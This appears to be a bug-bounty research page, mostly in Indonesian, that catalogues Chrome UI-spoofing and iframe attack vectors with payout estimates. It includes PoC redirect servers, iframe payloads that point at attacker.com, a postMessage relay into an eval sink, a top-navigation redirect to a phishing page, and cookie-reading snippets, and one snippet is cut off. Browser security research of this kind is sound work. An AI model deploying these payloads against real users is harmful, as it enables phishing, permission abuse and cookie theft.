Download Dialog Attribution Spoof

Potential $3K–$8K

Server attacker return 302 → legitimate-domain.com/file.pdf. Chrome download bar/dialog: apakah tunjuk attacker.com atau legitimate-domain.com sebagai download source? Bug jika tunjuk final URL sebagai trusted source.

Vector ini butuh server. PoC ini simulate dengan meta refresh + Content-Disposition header. Untuk full test, deploy script PHP/Python yang return 302 redirect ke file. 
# Server-side PoC (simpan sebagai redirect.php)
<?php
header("Location: https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png");
header("Content-Disposition: attachment; filename=google-logo.png");
exit();
?>

# Atau Python:
from flask import Flask, redirect
app = Flask(__name__)

@app.route('/evil-download')
def evil():
    r = redirect('https://accounts.google.com/logo.png')
    r.headers['Content-Disposition'] = 'attachment; filename=invoice.pdf'
    return r

V8

Permission Dialog Origin Spoof

Potential $10K–$25K

Permission dialogs (camera, mic, geolocation, notifications) menampilkan origin sebagai indikator kepercayaan utama. Bug: dialog tunjuk origin yang salah → user kasih izin ke attacker, mengira sedang izinkan victim domain. 5 sub-vector: popup race, cross-origin iframe, sandboxed iframe, data: URL, pre-navigation inject.

⚡ Highest reward class — permission spoof = user secara eksplisit grant akses ke sensor (camera/mic/GPS) ke attacker. Chrome VRP prioritaskan ini karena langsung bypass user trust model.

V8a — Popup Permission Race

Buka popup ke https://google.com. Sebelum navigation commit, inject script yang panggil navigator.mediaDevices.getUserMedia(). Jika berhasil, permission dialog akan tunjuk google.com padahal request datang dari attacker (localhost).

  • 1Klik Launch → popup ke google.com terbuka
  • 2Dalam race window, opener coba inject getUserMedia ke popup
  • 3Amati: permission dialog muncul dengan origin apa?
  • 4Jika dialog tunjuk google.com → CRITICAL BUG
30ms

V8b — Cross-Origin iframe Permission Confusion

Embed iframe dari localhost (attacker) di dalam page yang sudah load. iframe request permission → apakah dialog tunjuk parent origin atau iframe origin? Dengan allow="camera" permissions policy, parent bisa delegate permission ke iframe — user mungkin tidak sadari iframe origin berbeda.

  • 1Inject iframe dengan allow="camera;microphone"
  • 2iframe request getUserMedia → perhatikan origin di dialog
  • 3Test: apakah iframe origin jelas tertampil atau disembunyikan?

V8c — Sandboxed iframe Permission (allow-same-origin bypass)

Sandboxed iframe dengan sandbox="allow-scripts allow-same-origin" + allow="camera". Bug target: sandboxed iframe request permission dan dialog tunjuk parent origin, padahal sandbox harusnya isolate context. Atau: sandbox tanpa allow-same-origin bisa request permission dengan null origin. 

<!-- Sandbox iframe: origin = null (opaque) -->
<iframe sandbox="allow-scripts"
        allow="camera; microphone; geolocation"
        src="attacker-page.html"></iframe>

V8d — data: URL Permission Origin

data: URL punya null/opaque origin. Test: jika data: URL page request camera/mic/geo, permission dialog tunjuk apa? Chrome seharusnya tunjuk "data:" atau blok permission. Bug jika tunjuk localhost (parent/opener origin). 

// data: URL dibuka sebagai popup / iframe
const page = btoa(`<script>

const url = `data:text/html;base64,${page}`;

V9

iframe Injection & Content Spoof

Potential $8K–$30K

6 sub-vector serangan berbasis iframe: injeksi konten lintas-origin, UI overlay clickjacking, srcdoc origin inheritance, postMessage relay bypass, top-level navigation hijack, dan document.domain relaxation untuk cross-origin DOM read. Setiap vector memiliki impact berbeda — dari info disclosure hingga full page takeover.

⚡ V9e (Top Nav Hijack) dan V9d (postMessage Relay) adalah yang paling reportable — keduanya mempengaruhi halaman luar iframe, bukan hanya konten di dalamnya.

V9a — srcdoc iframe Origin Inheritance

<iframe srcdoc="..."> inherits origin dari parent page — bukan null/opaque. Bug target: apakah srcdoc content bisa melakukan aksi yang harusnya restricted ke parent origin? Contoh: fetch() ke cookie-bearing endpoint, localStorage read, atau document.cookie access dengan parent's origin. 

<!-- srcdoc: origin = parent's origin (localhost) -->
<iframe srcdoc="<script>
  console.log('origin:', window.origin);
  console.log('cookie:', document.cookie);
  fetch('/api/secret').then(r=>r.text()).then(console.log)
</script>"></iframe>

<!-- Bug: srcdoc bisa baca localStorage/cookie parent tanpa same-origin check? -->

V9b — Open Redirect → iframe Content Spoof

Jika trusted domain punya open redirect (trusted.com/go?url=attacker.com), embed sebagai iframe src. Dari perspektif parent page, iframe src terlihat dari trusted.com. Tapi content setelah redirect dari attacker.com. Bug chain: CSP frame-src trusted.com bypass, atau postMessage trust check yang hanya lihat initial src, bukan final destination. 

<!-- Parent CSP: frame-src https://trusted.com -->
<iframe src="https://trusted.com/redirect?url=https://attacker.com"></iframe>
<!-- iframe akhirnya load attacker.com — CSP bypass jika redirect diizinkan -->

// postMessage trust yang salah:
window.addEventListener('message', e => {
  // Hanya cek e.origin pada saat pesan dikirim — bukan final iframe origin
  if (e.source === iframe.contentWindow) processMessage(e.data); // VULN
});
→ Ready.

V9d — postMessage Origin Relay Bypass

App A percaya pesan dari trusted.com. Attacker embed trusted.com sebagai iframe, lalu kirim pesan ke iframe tersebut. Jika trusted.com memiliki "relay" pattern (echo/forward pesan tanpa validasi), pesan attacker tiba di app A dengan e.origin = trusted.com. Juga test: targetOrigin="*" leak dan MessageChannel port transfer abuse. 

// Victim app — hanya percaya pesan dari trusted.com
window.addEventListener('message', e => {
  if (e.origin !== 'https://trusted.com') return;
  eval(e.data.code); // ← SINK
});

// trusted.com punya relay yang naive:
window.addEventListener('message', e => {
  window.parent.postMessage(e.data, '*'); // ← forward tanpa validasi origin
});
→ Ready.

V9e — Top-Level Navigation Hijack via iframe

Sandboxed iframe dengan allow-top-navigation atau allow-top-navigation-by-user-activation dapat navigate window.top. Jika embed pihak ketiga (iklan, widget) punya flag ini, mereka bisa redirect seluruh halaman ke attacker URL. Juga test: _blank target link dari cross-origin iframe yang bisa memanipulasi opener. 

<!-- Attacker-controlled iframe yang diembed oleh victim site -->
<iframe sandbox="allow-scripts allow-top-navigation"
        src="https://attacker.com/evil-ad"></iframe>

<!-- Di dalam evil-ad.html: -->
<script>
  top.location = 'https://attacker.com/phishing-page';
  // Entire victim page sekarang di-redirect ke attacker
</script>
→ Ready.

V9f — document.domain Relaxation & Cross-Origin DOM Read

Dua halaman dari subdomain berbeda (a.example.com dan b.example.com) yang sama-sama set document.domain = "example.com" menjadi same-origin satu sama lain. Chrome 106+ mulai deprecate ini via Origin-Agent-Cluster, tapi masih ada bypass. Bug target: apakah masih ada path untuk relax document.domain dan baca DOM cross-subdomain? 

// Page A: a.localhost / Page B: b.localhost
// Keduanya set:
document.domain = "localhost";

// Setelah itu, A bisa akses B's DOM:
const iframe = document.querySelector('iframe'); // src=b.localhost
console.log(iframe.contentDocument.cookie); // cross-subdomain cookie theft

// Chrome 106+: blocked by Origin-Agent-Cluster header
// Test: apakah masih ada bypass via null origin / data: iframe / srcdoc chain?
